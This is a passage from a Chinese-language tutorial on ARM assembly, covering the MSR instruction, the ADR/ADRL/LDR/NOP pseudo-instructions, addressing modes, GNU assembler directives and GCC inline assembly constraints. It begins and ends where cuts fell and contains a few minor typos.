CPSR_c,R0 ​ MOV PC,LR ​ 禁能IRQ 中断例程： ​ DISABLE_IRQ ​ MRS R0,CPSR ​ ORR R0,R0,#0x80 ​ MSR CPSR_c,R0 ​ MOV PC,LR\nMSR ​ 写状态寄存器指令。在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR。指令格式如下： ​ MSR{cond} psr_fields,#immed_8r ​ MSR{cond} psr_fields,Rm ​ 其中： psr CPSR 或SPSR ​ fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)： ​ c 控制域屏蔽字节(psr[7…0]) ​ x 扩展域屏蔽字节(psr[15…8]) ​ s 状态域屏蔽字节(psr[23。…16]) ​ f 标志域屏蔽字节(psr[31…24]) ​ immed_8r 要传送到状态寄存器指定域的立即数，8 位。 ​ Rm 要传送到状态寄存器指定域的数据的源寄存器。 ​ MSR 指令举例如下： ​ MSR CPSR_c,#0xD3 ;CPSR[7…0]=0xD3，即切换到管理模式。 ​ MSR CPSR_cxsf,R3 ;CPSR=R3 ​ 只有在特权模式下才能修改状态寄存器。 ​ 程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态/Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许/禁止IRQ/FIQ 中断等设置。 ​ 堆栈指令实始化例程： ​ INITSTACK ​ MOV R0,LR ;保存返回地址 ​ ;设置管理模式堆栈 ​ MSR CPSR_c,#0xD3 ​ LDR SP,StackSvc ​ ;设置中断模式堆栈 ​ MSR CPSR_c,#0xD2 ​ LDR SP,StackIrq ​ …\n1.3.6. ARM 伪指令 ​ ARM 伪指令不是ARM 指令集中的指令，只是为了编程方便编译器定义了伪指令，使用时可以像其它ARM 指令一样使用，但在编译时这些指令将被等效的ARM 指令代替。ARM伪指令有四条，分别为ADR 伪指令、ADRL 伪指令、LDR 伪指令和NOP 伪指令。\nADR ​ 小范围的地址读取伪指令。ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败。 ​ ADR 伪指令格式如下： ​  ADR{cond} register,exper ​ 其中：register 加载的目标寄存器。 ​ exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。 ​ 对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。 ​ ADR 伪指令举例如下： ​ LOOP MOV R1, #0xF0 ​ … ​ ADR R2, LOOP ;将LOOP 的地址放入R2 ​ ADR R3, LOOP+4 ​ 可以用ADR 加载地址，实现查表： ​ … ​ ADR R0,DISP_TAB ;加载转换表地址 ​ LDRB R1,[R0,R2] ;使用R2作为参数，进行查表 ​ … ​ DISP_TAB ​ DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90\nADRL ​ 中等范围的地址读取伪指令。ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败。ADRL伪指令格式如下： ​ ADR{cond} register,exper ​ 其中：register 加载的目标寄存器。 ​ expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。 ​ ADRL 伪指令举例如下： ​ ADRL R0,DATA_BUF ​ … ​ ADRL R1 DATA_BUF+80 ​ … ​ DATA_BUF ​ SPACE 100 ;定义100 字节缓冲区 ​ 可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载： ​ … ​ ADR LR,RETURNI ;设置返回地址 ​ ADRL R1Thumb_Sub+1 ;取得了Thumb 子程序入口地址，且R1 的0 位置1 ​ BX R1 ;调用Thumb子程序，并切换处理器状态 ​ RETURNI ​ … ​ CODE16 ​ Thumb_Sub ​ MOV R1,#10 ​ …\nLDR ​ 大范围的地址读取伪指令。LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量。LDR 伪指令格式如下： ​ LDR{cond} register,=expr/label_expr ​ 其中：register 加载的目标寄存器 ​ expr 32 位立即数。 ​ label_expr 基于PC 的地址表达式或外部表达式。 ​ LADR 伪指令举例如下：。 ​ LDR R0,=0x123456 ;加载32 位立即数0x12345678 ​ LDR R0,=DATA_BUF+60 ;加载DATA_BUF 地址+60 ​ … ​ LTORG ;声明文字池 ​ 伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数： ​ … ​ LDR R0,=IOPIN ;加载GPIO 寄存器IOPIN 的地址 ​ LDR R1,[R0] ;读取IOPIN 寄存器的值 ​ … ​ LDR R0,=IOSET ​ LDR R1,=0x00500500 ​ STR R1,[R0] ;IOSET=0x00500500 ​ … ​ 从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“=”号\nNOP ​ 空操作伪指令。NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等，NOP 伪指令格式如下： ​ NOP ​ NOP ​ NOP ​ NOP ​ SUBS R1, R1, #1 ​ BNE DELAY1 ​ …\n1.4. 寻址方式 1.4.1. 立即数寻址 立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“\u0026”，二进制数“#”后面加“%”。\n1.4.2. 寄存器寻址 1.4.3. 寄存器间接寻址 以寄存器中的值作为操作数的地址，而操作数本身放在存储器中。\n例如：\nADD R0，R1，[R2] 1.4.4. 基址变址寻址 将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址。\n例如：LDR R0，[R1，#4] R0\u003c-[R1+4]\n1.4.5. 多寄存器寻址 一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值。\nLDMIA R0，{R1，R2，R3，R4}\n1.4.6. 相对寻址 以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址。\n例如：BL NEXT;\n1.4.7. 堆栈寻址 使用一个堆栈指针的专用寄存器指示当前操作位置\n递增堆栈：向高地址方向生长\n递减堆栈：向低地址方向生长\n满堆栈：堆栈指针指向最后压入堆栈的有效数据\n空堆栈：堆栈指针指向下一个要放入数据的空位置\n2. GNU ARM混编 ​ 汇编源程序一般用于系统最基本的初始化：初始化堆栈指针、设置页表、操作 ARM的协处理器等。这些初始化工作完成后就可以跳转到C代码main函数中执行。\n1.1. GNU汇编语言语句格式 ​ 任何Linux汇编行都是如下结构：[:][} @comment\nl instruction为指令\nl directive为伪操作\nl pseudo-instruction为伪指令\nl **:**为标号, GNU汇编中，任何以冒号结尾的标识符都被认为是一个标号，而不一定非要在一行的开始。\nl comment为语句的注释\n下面定义一个\"add\"的函数，最终返回两个参数的和：\n.section.text, “x”\n.globaladd @ give the symbol “add” externallinkage\nadd:\n​ ADD r0, r0, r1 @ add input arguments\n​ MOV pc, lr @ return from subroutine\n@ endof program\n注意：\nl ARM指令，伪指令，伪操作，寄存器名可以全部为大写字母，也可全部为小写字母，但不可大小写混用。\nl 如果语句太长，可以将一条语句分几行来书写，在行末用“\\”表示换行（即下一行与本行为同一语句）。“\\”后不能有任何字符，包含空格和制表符（Tab)。\n1.2. GNU汇编程序中的标号symbol（或label） ​ 标号只能由a～z，A～Z，0～9，“.”，_等（由点、字母、数字、下划线等组成，除局部标号外，不能以数字开头）字符组成。\nSymbol的本质：代表它所在的地址,因此也可以当作变量或者函数来使用。\nl 段内标号的地址值在汇编时确定；\nl 段外标号的地址值在连接时确定。\nSymbol的分类：3类（依据标号的生成方式）。\n\u003c1\u003e 基于PC的标号。基于PC的标号是位于目标指令前的标号或者程序中数据定义伪操作前的标号。这种标号在汇编时将被处理成PC值加上（或减去）一个数字常量，常用于表示跳转指令**”b”**等的目标地址，或者代码段中所嵌入的少量数据。\n\u003c2\u003e 基于寄存器的标号。基于寄存器的标号常用MAP和FIELD来定义，也可以用EQU来定义。这种标号在汇编时将被处理成寄存器的值加上（或减去）一个数字常量，常用于访问数据段中的数据。\n\u003c3\u003e 绝对地址。绝对地址是一个32位数据。它可以寻址的范围为[0，232-1]即可以直接寻址整个内存空间。\n**特别说明：**局部标号Symbol\n​ 局部标号主要在局部范围内使用，而且局部标号可以重复出现。它由两部组成：开头是一个0-99直接的数字，后面紧接一个通常表示该局部变量作用范围的符号。局部变量的作用范围通常为当前段，也可以用ROUT来定义局部变量的作用范围。\n​ 局部变量定义的语法格式：N{routname}\nl N：为0~99之间的数字。\nl routname：当前局部范围的名称（为符号），通常为该变量作用范围的名称（用ROUT伪操作定义的）。\n​ 局部变量引用的语法格式：%{F|B}{A|T}N{routname}\nl %：表示引用操作\nl N：为局部变量的数字号\nl routname：为当前作用范围的名称（用ROUT伪操作定义的）\nl F：指示编译器只向前搜索\nl B：指示编译器只向后搜索\nl A：指示编译器搜索宏的所有嵌套层次\nl T：指示编译器搜索宏的当前层次\n例：使用局部符号的例子，一段循环程序\nsubs r0, r0, #1 @每次循环使r0=r0-1\nbne 1F @跳转到1标号去执行\n注意：\nl 如果F和B都没有指定，编译器先向前搜索，再向后搜索\nl 如果A和T都没有指定，编译器搜索所有从当前层次到宏的最高层次，比当前层次低的层次不再搜索。\nl 如果指定了routname，编译器向前搜索最近的ROUT伪操作，若routname与该ROUT伪操作定义的名称不匹配，编译器报告错误，汇编失败。\n1.3. GNU汇编程序中的分段 \u003c1\u003e .section伪操作\n.section \u003csection_name\u003e {,””}\nStartsa new code or data section. Sections in GNU are called .text, a code section, .data, an initializeddata section, and .bss, an uninitialized data section.\nThesesections have default flags, and the linker understands the default names(similardirective to the armasm directive AREA).The following are allowable .section flags for ELF format files:\n Meaning\na allowable section\nw writable section\nx executable section\n中文解释：\n用户可以通过.section伪操作来自定义一个段,格式如下：\n.section section_name [,\"flags\"[, %type[,flag_specific_arguments]]]\n每一个段以段名为开始, 以下一个段名或者文件结尾为结束。这些段都有缺省的标志（flags），连接器可以识别这些标志。(与arm asm中的AREA相同)。下面是ELF格式允许的段标志flags：\n\u003c标志\u003e 含义\na 允许段\nw 可写段\nx 执行段\n例：定义一个“段”\n.section.mysection @自定义数据段，段名为 “.mysection”\n.align 2\nstrtemp:\n​ .ascii \"Temp string \\n\\0\" @对这一句的理解，我觉得应该是：将\"Temp string \\n\\0\"这个字符串存储在以标号strtemp为起始地址的一段内存空间里\n\u003c2\u003e 汇编系统预定义的段名\nl .text @代码段\nl .data @初始化数据段.data Read-write initialized long data.\nl .bss @未初始化数据段\nl .sdata @ .sdata Read-write initialized short data.\nl .sbss @\n注意：源程序中.bss段应该在.text段之前。\n1.4. GNU汇编语言定义入口点 汇编程序的缺省入口是**_start**标号，**用户也可以在连接脚本文件中用ENTRY标志指明其它入口点**。\n例：定义入口点\n.section .data\n\u003c initialized data here\u003e\n.section .bss\n\u003c uninitialized data here\u003e\n.section .text\n.globl _start\n_start:\n1.5. GNU汇编程序中的宏定义 格式如下：\n.macro 宏名参数名列表 @伪指令.macro定义一个宏\n宏体\n.endm @.endm表示宏结束\n​ 如果宏使用参数,那么在宏体中使用该参数时添加前缀**“\\”**。宏定义时的参数还可以使用默认值。可以使用.exitm伪指令来退出宏。\n例：宏定义\n.macroSHIFTLEFT a, b\n.if \\b\u003c 0\nMOV \\a,\\a, ASR #-\\b\n.exitm\n.endif\nMOV \\a,\\a, LSL #\\b\n.endm\n1.6. GNU汇编程序中的常数 \u003c1\u003e 十进制数以非0数字开头,如:123和9876；\n\u003c2\u003e 二进制数以0b开头,其中字母也可以为大写；\n\u003c3\u003e 八进制数以0开始,如:0456,0123；\n\u003c4\u003e 十六进制数以0x开头,如:0xabcd,0X123f；\n\u003c5\u003e 字符串常量需要用引号括起来,中间也可以使用转义字符,如: “You are welcome!\\n”；\n\u003c6\u003e 当前地址以“.”表示,在GNU汇编程序中可以使用这个符号代表当前指令的地址；\n\u003c7\u003e 表达式：在汇编程序中的表达式可以使用常数或者数值, “-”表示取负数, “~”表示取补,“\u003c\u003e”表示不相等,其他的符号如:+、-、*、/、%、\u003c、\u003c\u003c、\u003e、\u003e\u003e、|、\u0026、^、!、==、\u003e=、\u003c=、\u0026\u0026、|| 跟C语言中的用法相似。\n1.7. GNU ARM汇编的常用伪操作 ​ 在前面已经提到过了一些为操作，还有下面一些为操作：\nl 数据定义伪操作： .byte，.short，.long，.quad，.float，.string/.asciz/.ascii，重复定义伪操作.rept，赋值语句.equ/.set ；\nl 函数的定义；\nl 对齐方式伪操作 .align；\nl 源文件结束伪操作.end；\nl .include伪操作；\nl if伪操作；\nl .global/ .globl 伪操作；\nl .type伪操作；\nl 列表控制语句；\n别于GNU AS汇编的通用伪操作,下面是ARM特有的伪操作：\n.reg ，.unreq ，.code ，.thumb ，.thumb_func ，.thumb_set， .ltorg ，.pool\n\u003c1\u003e 数据定义伪操作\nl .byte:单字节定义，如：.byte 1,2,0b01,0x34,072,'s' ；\nl .short:定义双字节数据，如:.short 0x1234,60000 ；\nl .long:定义4字节数据，如:.long 0x12345678,23876565\nl .quad:定义8字节，如:.quad 0x1234567890abcd\nl .float：定义浮点数，如：.float 0f-314159265358979323846264338327\\\n​ 95028841971.693993751E-40 @ - pi\nl .string/.asciz/.ascii：定义多个字符串，如:\n.string \"abcd\",\"efgh\", \"hello!\"\n.asciz \"qwer\",\"sun\", \"world!\"\n.ascii \"welcome\\0\"\n​ 注意：ascii伪操作定义的字符串需要自行添加结尾字符'\\0'。\nl .rept:重复定义伪操作, 格式如下：\n.rept 重复次数\n数据定义\n.endr @结束重复定义\n例：\n.rept 3\n.byte 0x23\n.endr\nl .equ/.set: 赋值语句, 格式如下：\n.equ(.set)变量名，表达式\n例：\n.equ abc, 3 @让abc=3\n\u003c2\u003e 函数的定义伪操作\nl 函数的定义,格式如下：\n函数名**:**\n函数体\n返回语句\n​ 一般的,**函数如果需要在其他文件中调用, 需要用到.global伪操作将函数声明为全局函数。**为了不至于在其他程序在调用某个C函数时发生混乱,对寄存器的使用我们需要遵循APCS准则。函数编译器将处理函数代码为一段.global的汇编码。\nl 函数的编写应当遵循如下规则：\na. a1-a4寄存器（参数、结果或暂存寄存器，r0到r3 的同义字）以及浮点寄存器f0-f3(如果存在浮点协处理器)在函数中是不必保存的；\nb. 如果函数返回一个不大于一个字大小的值，则在函数结束时应该把这个值送到 r0 中；\nc. 如果函数返回一个浮点数，则在函数结束时把它放入浮点寄存器f0中；\nd. 如果函数的过程改动了sp（堆栈指针，r13）、fp（框架指针，r11）、sl（堆栈限制，r10）、lr（连接寄存器，r14）、v1-v8（变量寄存器，r4 到 r11）和 f4-f7,那么函数结束时这些寄存器应当被恢复为包含在进入函数时它所持有的值。\n\u003c3\u003e .align .end .include .incbin伪操作\nl .align:用来指定数据的对齐方式,格式如下:\n​ .align [absexpr1, absexpr2]\n​ 以某种对齐方式,在未使用的存储区域填充值. 第一个值表示对齐方式,4, 8,16或 32.第二个表达式值表示填充的值。\nl .end:表明源文件的结束。\nl .include:可以将指定的文件在使用.include 的地方展开,一般是头文件,例如:\n​ .include “myarmasm.h”\nl .incbin伪操作可以将原封不动的一个二进制文件编译到当前文件中,使用方法如下:\n​ .incbin\"file\"[,skip[,count]]\n​ skip表明是从文件开始跳过skip个字节开始读取文件,count是读取的字数.\n\u003c4\u003e ..if伪操作\n​ 根据一个表达式的值来决定是否要编译下面的代码, 用.endif伪操作来表示条件判断的结束,中间可以使用.else来决定.if的条件不满足的情况下应该编译哪一部分代码。\n.if有多个变种:\n.ifdefsymbol @判断symbol是否定义\n.ifcstring1,string2 @字符串string1和string2是否相等,字符串可以用单引号括起来\n.ifeqexpression @判断expression的值是否为0\n.ifeqsstring1,string2 @判断string1和string2是否相等,字符串必须用双引号括起来\n.ifgeexpression @判断expression的值是否大于等于0\n.ifgtabsolute expression @判断expression的值是否大于0\n.ifleexpression @判断expression的值是否小于等于0\n.ifltabsolute expression @判断expression的值是否小于0\n.ifncstring1,string2 @判断string1和string2是否不相等, 其用法跟.ifc恰好相反。\n.ifndefsymbol, .ifnotdef symbol @判断是否没有定义symbol, 跟.ifdef恰好相反\n.ifneexpression @如果expression的值不是0, 那么编译器将编译下面的代码\n.ifnesstring1,string2 @如果字符串string1和string2不相等, 那么编译器将编译下面的代码.\n\u003c5\u003e .global .type .title .list\nl .global/ .globl ：用来定义一个全局的符号，格式如下:\n​ .global symbol 或者 .globl symbol\nl .type：用来指定一个符号的类型是函数类型或者是对象类型, 对象类型一般是数据, 格式如下:\n​ .type 符号, 类型描述\n例：\n.globla\n.data\n.align4\n.typea, @object\n.sizea, 4\na:\n.long10\n例：\n.section.text\n.typeasmfunc, @function\n.globlasmfunc\nasmfunc:\nmov pc,lr\n\u003c6\u003e 列表控制语句:\n.title：用来指定汇编列表的标题,例如:\n.title “my program”\n.list：用来输出列表文件.\n\u003c7\u003e ARM特有的伪操作\nl .reg: 用来给寄存器赋予别名,格式如下:\n​ 别名 .req 寄存器名\nl .unreq: 用来取消一个寄存器的别名,格式如下:\n.unreq 寄存器别名\n​ 注意被取消的别名必须事先定义过,否则编译器就会报错,这个伪操作也可以用来取消系统预制的别名, 例如r0, 但如果没有必要的话不推荐那样做。\nl .code伪操作用来选择ARM或者Thumb指令集,格式如下:\n.code 表达式\n　如果表达式的值为16则表明下面的指令为Thumb指令,如果表达式的值为32则表明下面的指令为ARM指令.\nl .thumb伪操作等同于.code 16, 表明使用Thumb指令, 类似的.arm等同于.code 32\nl .force_thumb伪操作用来强制目标处理器选择thumb的指令集而不管处理器是否支持\nl .thumb_func伪操作用来指明一个函数是thumb指令集的函数\nl .thumb_set伪操作的作用类似于.set, 可以用来给一个标志起一个别名, 比.set功能增加的一点是可以把一个标志标记为thumb函数的入口, 这点功能等同于.thumb_func\nl .ltorg用于声明一个数据缓冲池(literal pool)的开始,它可以分配很大的空间。\nl .pool的作用等同.ltorg\nl .space\u003cnumber_of_bytes\u003e {,\u003cfill_byte\u003e}\n​ 分配number_of_bytes字节的数据空间，并填充其值为fill_byte，若未指定该值，缺省填充0。（与armasm中的SPACE功能相同）\nl .word {,} …插入一个32-bit的数据队列。（与armasm中的DCD功能相同）可以使用.word把标识符作为常量使用。\n例：\nStart:\nvalueOfStart:\n​ .word Start\n这样程序的开头Start便被存入了内存变量valueOfStart中。\nl .hword {,} …\n插入一个16-bit的数据队列。（与armasm中的DCW相同）\n1.8. GNU ARM汇编特殊字符和语法 \u003c1\u003e 代码行中的注释符号: ‘@’\n\u003c2\u003e 整行注释符号: ‘#’\n\u003c3\u003e 语句分离符号: ‘;’\n\u003c4\u003e 立即数前缀: ‘#’ 或 ‘$’\n3. ARM GCC 内嵌汇编 对于基于ARM的RISC处理器，GNUC编译器提供了在C代码中内嵌汇编的功能。这种非常酷的特性提供了C代码没有的功能，比如手动优化软件关键部分的代码、使用相关的处理器指令。这里设想了读者是熟练编写ARM汇编程序读者，因为该片文档不是ARM汇编手册。同样也不是C语言手册。这篇文档假设使用的是GCC 4 的版本，但是对于早期的版本也有效。\nGCCasm 声明\n让我们以一个简单的例子开始。就像C中的声明一样，下面的声明代码可能出现在你的代码中。\n/*NOP 例子 */\nasm(\"movr0,r0\");\n该语句的作用是将r0移动到r0中。换句话讲他并不干任何事。典型的就是NOP指令，作用就是短时的延时。\n请接着阅读和学习这篇文档，因为该声明并不像你想象的和其他的C语句一样。内嵌汇编使用汇编指令就像在纯汇编程序中使用的方法一样。可以在一个asm声明中写多个汇编指令。但是为了增加程序的可读性，最好将每一个汇编指令单独放一行。\nasm(\n\"mov r0, r0\\n\\t\"\n\"mov r0, r0\\n\\t\"\n\"mov r0, r0\\n\\t\"\n\"mov r0, r0\"\n);\n换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。到目前为止，汇编指令和你写的纯汇编程序中的代码没什么区别。但是对比其它的C声明，asm的常量和寄存器的处理是不一样的。通用的内嵌汇编模版是这样的。\nasm(code : output operand list : input operand list : clobberlist);\n汇编和C语句这间的联系是通过上面asm声明中可选的outputoperand list和input operand list。Clobber list后面再讲。\n下面是将c语言的一个整型变量传递给汇编，逻辑左移一位后在传递给C语言的另外一个整型变量。\n/* Rotating bits example */\nasm(\"mov %[result], %[value], ror #1\" :[result] \"=r\" (y) : [value] \"r\" (x));\n每一个asm语句被冒号（:）分成了四个部分。\n汇编指令放在第一部分中的“”中间。\n\"mov %[result], %[value], ror #1\"\n接下来是冒号后的可选择的output operand list，每一个条目是由一对[]（方括号）和被他包括的符号名组成，它后面跟着限制性字符串，再后面是圆括号和它括着的C变量。这个例子中只有一个条目。\n[result] \"=r\" (y)\n接着冒号后面是输入操作符列表，它的语法和输入操作列表一样\n[value] \"r\" (x)\n破坏符列表，在本例中没有使用\n就像上面的NOP例子，asm声明的4个部分中，只要最尾部没有使用的部分都可以省略。但是有有一点要注意的是，上面的4个部分中只要后面的还要使用，前面的部分没有使用也不能省略，必须空但是保留冒号。下面的一个例子就是设置ARMSoc的CPSR寄存器，它有input但是没有output operand。\nasm(\"msr cpsr,%[ps]\" : : [ps]\"r\"(status))\n即使汇编代码没有使用，代码部分也要保留空字符串。下面的例子使用了一个特别的破坏符，目的就是告诉编译器内存被修改过了。这里的破坏符在下面的优化部分在讲解。\nasm(\"\":::\"memory\");\n为了增加代码的可读性，你可以使用换行，空格，还有C风格的注释。\nasm(\"mov %[result], %[value], ror#1\"\n​ : [result]\"=r\" (y) /*Rotation result. */\n​ : [value]\"r\" (x) /*Rotated value. */\n​ : /* No clobbers */\n);\n在代码部分%后面跟着的是后面两个部分方括号中的符号，它指的是相同符号操作列表中的一个条目。\n%[result]表示第二部分的C变量y，%[value]表示三部分的C变量x；\n符号操作符的名字使用了独立的命名空间。这就意味着它使用的是其他的符号表。简单一点就是说你不必关心使用的符号名在C代码中已经使用了。在早期的C代码中，循环移位的例子必须要这么写：\nasm(\"mov %0, %1, ror #1\" :\"=r\" (result) : \"r\" (value))\n在汇编代码中操作数的引用使用的是%后面跟一个数字，%1代表第一个操作数，%2代码第二个操作数，往后的类推。这个方法目前最新的编译器还是支持的。但是它不便于维护代码。试想一下，你写了大量的汇编指令的代码，要是你想插入一个操作数，那么你就不得不从新修改操作数编号。\n优化C代码\n有两种情况决定了你必须使用汇编。1st，C限制了你更加贴近底层操作硬件，比如，C中没有直接修改程序状态寄存器（PSR）的声明。2nd就是要写出更加优化的代码。毫无疑问GNUC代码优化器做的很好，但是他的结果和我们手工写的汇编代码相差很远。\n这一部分有一点很重要，也是被别人忽视最多的就是：我们在C代码中通过内嵌汇编指令添加的汇编代码，也是要被C编译器的优化器处理的。让我们下面做个试验来看看吧。\n下面是代码实例。\nbigtree@just:~/embedded/basic-C$ arm-linux-gcc -c test.c\nbigtree@just:~/embedded/basic-C$ arm-linux-objdump -D test.o\n编译器选择r3作为循环移位使用。它也完全可以选择为每一个C变量分配寄存器。Load或者store一个值并不显式的进行。下面是其它编译器的编译结果。\nE420A0E1 mov r2, r4, ror #1 @ y, x\n编译器为每一个操作数选择一个相应的寄存器，将操作过的值cache到r4中，然后传递该值到r2中。这个过程你能理解不？\n有的时候这个过程变得更加糟糕。有时候编译器甚至完全抛弃你嵌入的汇编代码。C编译器的这种行为，取决于代码优化器的策略和嵌入汇编所处的上下文。如果在内嵌汇编语句中不使用任何输出部分，那么C代码优化器很有可能将该内嵌语句完全删除。比如NOP例子，我们可以使用它作为延时操作，但是对于编译器认为这影响了程序的执行速速，认为它是没有任何意义的。\n上面的解决方法还是有的。那就是使用volatile关键字。它的作用就是禁止优化器优化。将NOP例子修改过后如下：\n/* NOP example, revised */\nasm volatile(\"movr0, r0\");\n下面还有更多的烦恼等着我们。一个设计精细的优化器可能重新排列代码。看下面的代码：\ni++;\nif (j == 1)\nx += 3;\ni++;\n优化器肯定是要从新组织代码的，两个i++并没有对if的条件产生影响。更进一步的来讲，i的值增加2，仅仅使用一条ARM汇编指令。因而代码要重新组织如下：\nif (j == 1)\nx += 3;\ni += 2;\n这样节省了一条ARM指令。结果是：这些操作并没有得到许可。\n这些将对你的代码产生很到的影响，这将在下面介绍。下面的代码是c乘b，其中c和b中的一个或者两个可能会被中断处理程序修改。进入该代码前先禁止中断，执行完该代码后再开启中断。\nasm volatile(\"mrs r12,cpsr\\n\\t\"\n\"orr r12, r12, #0xC0\\n\\t\"\n\"msr cpsr_c, r12\\n\\t\" ::: \"r12\", \"cc\");\nc = b; / This may fail. */\nasm volatile(\"mrs r12, cpsr\\n\"\n\"bic r12, r12, #0xC0\\n\"\n\"msr cpsr_c, r12\" ::: \"r12\", \"cc\");\n但是不幸的是针对上面的代码，优化器决定先执行乘法然后执行两个内嵌汇编，或相反。这样将会使得我们的代码变得毫无意义。\n我们可以使用clobberlist帮忙。上面例子中的clobber list如下：\n\"r12\",\"cc\"\n上面的clobber list将会将向编译器传达如下信息，修改了r12和程序状态寄存器的标志位。Btw，直接指明使用的寄存器，将有可能阻止了最好的优化结果。通常你只要传递一个变量，然后让编译器自己选择适合的寄存器。另外寄存器名，cc（condition registor 状态寄存器标志位），memory都是在clobber list上有效的关键字。它用来向编译器指明，内嵌汇编指令改变了内存中的值。这将强迫编译器在执行汇编代码前存储所有缓存的值，然后在执行完汇编代码后重新加载该值。这将保留程序的执行顺序，因为在使用了带有memory clobber的asm声明后，所有变量的内容都是不可预测的。\nasm volatile(\"mrs r12,cpsr\\n\\t\"\n\"orr r12, r12, #0xC0\\n\\t\"\n\"msr cpsr_c, r12\\n\\t\" :: : \"r12\", \"cc\",\"memory\");\nc = b; / This is safe. */\nasm volatile(\"mrs r12, cpsr\\n\"\n\"bic r12, r12, #0xC0\\n\"\n\"msr cpsr_c, r12\" ::: \"r12\", \"cc\",\"memory\");\n使所有的缓存的值都无效，只是局部最优（suboptimal）。你可以有选择性的添加dummyoperand 来人工添加依赖。\nasm volatile(\"mrs r12,cpsr\\n\\t\"\n\"orr r12, r12, #0xC0\\n\\t\"\n\"msr cpsr_c, r12\\n\\t\" : \"=X\" (b) :: \"r12\",\"cc\");\nc = b; / This is safe. */\nasm volatile(\"mrs r12\n上面的第一个asm试图修改变量先b，第二个asm试图修改c。这将保留三个语句的执行顺序，而不要使缓存的变量无效。\n理解优化器对内嵌汇编的影响很重要。如果你读到这里还是云里雾里，最好是在看下个主题之前再把这段文章读几遍^_^。\nInput and output operands\n前面我们学到，每一个input和output operand，由被方括号[]中的符号名，限制字符串，圆括号中的C表达式构成。\n这些限制性字符串有哪些，为什么我们需要他们？你应该知道每一条汇编指令只接受特定类型的操作数。例如：跳转指令期望的跳转目标地址。不是所有的内存地址都是有效的。因为最后的opcode只接受24位偏移。但矛盾的是跳转指令和数据交换指令都希望寄存器中存储的是32位的目标地址。在所有的例子中，C传给operand的可能是函数指针。所以面对传给内嵌汇编的常量、指针、变量，编译器必须要知道怎样组织到汇编代码中。\n对于ARM核的处理器，GCC 4 提供了一下的限制。\n   Constraint Usage in ARM state Usage in Thumb state     f Floating point registers f0 .. f7 Not available   G Immediate floating point constant Not available   H Same a G, but negated Not available   I Immediate value in data processing instructionse.g. ORR R0, R0, #operand Constant in the range 0 .. 255e.g. SWI operand   J Indexing constants -4095 .. 4095e.g. LDR R1, [PC, #operand] Constant in the range -255 .. -1e.g. SUB R0, R0, #operand   K Same as I, but inverted Same as I, but shifted   L Same as I, but negated Constant in the range -7 .. 7e.g. SUB R0, R1, #operand   l Same as r Registers r0..r7e.g. PUSH operand   M Constant in the range of 0 .. 32 or a power of 2e.g. MOV R2, R1, ROR #operand Constant that is a multiple of 4 in the range of 0 .. 1020e.g. ADD R0, SP, #operand   m Any valid memory address    N Not available Constant in the range of 0 .. 31e.g. LSL R0, R1, #operand   o Not available Constant that is a multiple of 4 in the range of -508 .. 508e.g. ADD SP, #operand   r General register r0 .. r15e.g. SUB operand1, operand2, operand3 Not available   W Vector floating point registers s0 .. s31 Not available   X Any operand         = ：Write-only operand, usually used for all output operands+ ：Read-write operand, must be listed as an output operand\u0026 ：A register that should be used for output only      Output operands必须为write-only，相应C表达式的值必须是左值。Input operands必须为read-only。C编译器是没有能力做这个检查。\n比较严格的规则是：不要试图向input operand写。但是如果你想要使用相同的operand作为input和output。限制性modifier（+）可以达到效果。例子如下：\nasm(\"mov %[value], %[value], ror #1\" : [value]\"+r\" (y))\n和上面例子不一样的是，最后的结果存储在input variable中。\n可能modifier + 不支持早期的编译器版本。庆幸的是这里提供了其他解决办法，该方法在最新的编译器中依然有效。对于input operators有可能使用单一的数字n在限制字符串中。使用数字n可以告诉编译器使用的第n个operand，operand都是以0开始计数。下面是例子：\nasm(\"mov %0, %0, ror #1\" : \"=r\" (value) :\"0\" (value))\n限制性字符串“0”告诉编译器，使用和第一个output operand使用同样input register。\n请注意，在相反的情况下不会自动实现。如果我没告诉编译器那样做，编译器也有可能为input和output选择相同的寄存器。第一个例子中就为input和output选择了r3。\n在多数情况下这没有什么，但是如果在input使用前output已经被修改过了，这将是致命的。在input和output使用不同寄存器的情况下，你必须使用\u0026modifier来限制outputoperand。下面是代码示例：\nasm volatile(\"ldr %0, 